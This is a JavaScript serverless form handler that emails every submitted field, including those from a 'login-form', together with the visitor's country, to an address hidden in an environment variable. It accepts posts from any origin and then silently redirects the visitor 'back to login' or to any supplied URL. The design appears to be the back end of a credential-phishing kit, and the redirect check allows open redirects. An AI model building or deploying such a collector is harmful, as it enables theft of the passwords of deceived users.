const FORM_OWNERS = {
  'contact-main': process.env.DEST_EMAIL,
  'login-form': process.env.LOGIN_EMAIL || process.env.DEST_EMAIL
};

const LOGIN_FALLBACK_URL =
  'https://wizformsubmit-8ojggbber-wizatdq092s-projects.vercel.app/';

function safeDecode(value = '') {
  try {
    return decodeURIComponent(String(value)).trim();
  } catch {
    return String(value).trim();
  }
}

function escapeHtml(value) {
  return String(value ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function isSafeRedirectUrl(url) {
  try {
    const parsed = new URL(url);
    return parsed.protocol === 'https:' || parsed.protocol === 'http:';
  } catch {
    return false;
  }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Accept');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).send('Use POST');
  }

  const formId = String(req.query?.formId || '');
  const recipientEmail = FORM_OWNERS[formId];

  if (!recipientEmail) {
    return res.status(404).send('Unknown Form ID');
  }

  const body = req.body && typeof req.body === 'object' ? req.body : {};
  if (body._honeypot) {
    return res.status(200).json({ ok: true });
  }

  const country = safeDecode(req.headers['x-vercel-ip-country'] || '') || 'Unknown';
  const submissionLabel = `New Form Submission : ${country}`;

  const entries = Object.entries(body).filter(
    ([key]) => !key.startsWith('_')
  );

  const plainTextBlock = [
    submissionLabel,
    '━━━━━━━━━━━━━━━━━━━━━━',
    ...entries.map(([k, v]) => `${k}: ${String(v ?? '')}`)
  ].join('\n');

  const rowsHtml = entries
    .map(
      ([k, v]) =>
        `<tr><td style="padding:4px 8px;font-weight:600;">${escapeHtml(k)}</td><td style="padding:4px 8px;">${escapeHtml(String(v ?? ''))}</td></tr>`
    )
    .join('');

  const html = `
    <div style="font-family:system-ui,-apple-system,sans-serif;max-width:600px;color:#111827;">
      <h2 style="margin:0 0 12px;font-size:18px;">${escapeHtml(submissionLabel)}</h2>
      <table style="width:100%;border-collapse:collapse;font-size:14px;">
        ${rowsHtml}
      </table>
    </div>
  `;

  const { error } = await resend.emails.send({
    from: 'WizFormSubmit <onboarding@resend.dev>',
    to: recipientEmail,
    subject: submissionLabel,
    text: plainTextBlock,
    html
  });

  if (error) {
    return res.status(500).json({ ok: false, error: error.message || 'Email send failed' });
  }

  const wantsJson = (req.headers.accept || '').includes('application/json') && req.headers['content-type']?.includes('application/json');
  if (wantsJson) {
    return res.status(200).json({ ok: true, label: submissionLabel });
  }

  const rawRedirect = typeof body._redirect === 'string' ? body._redirect.trim() : '';
  const targetUrl =
    rawRedirect && (rawRedirect === '#' || isSafeRedirectUrl(rawRedirect))
      ? rawRedirect
      : LOGIN_FALLBACK_URL;

  const safeTargetAttr = escapeHtml(targetUrl);
  const safeTargetJs = JSON.stringify(targetUrl);

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  return res.status(200).send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Sending Email...</title>
  <style>
    body {
      font-family: system-ui, -apple-system, sans-serif;
      display: grid;
      place-items: center;
      min-height: 100vh;
      margin: 0;
      background: #f9fafb;
      color: #111827;
    }
    .card {
      text-align: center;
      padding: 2rem;
      border-radius: 12px;
      background: #ffffff;
      border: 1px solid #e5e7eb;
      max-width: 380px;
    }
    .spinner {
      width: 32px;
      height: 32px;
      margin: 0 auto 1rem;
      border: 3px solid #e5e7eb;
      border-top-color: #111827;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="spinner" aria-hidden="true"></div>
    <h2>Emailing &amp; loading...</h2>
    <p id="status-text">Finishing up and returning to login...</p>
    <p><a id="continue-link" href="${safeTargetAttr}">Return to login</a></p>
  </div>
  <script>
    const nextUrl = ${safeTargetJs};
    setTimeout(() => {
      document.getElementById('status-text').textContent = 'Redirecting...';
      window.location.replace(nextUrl);
    }, 2000);
  </script>
</body>
</html>`);
}
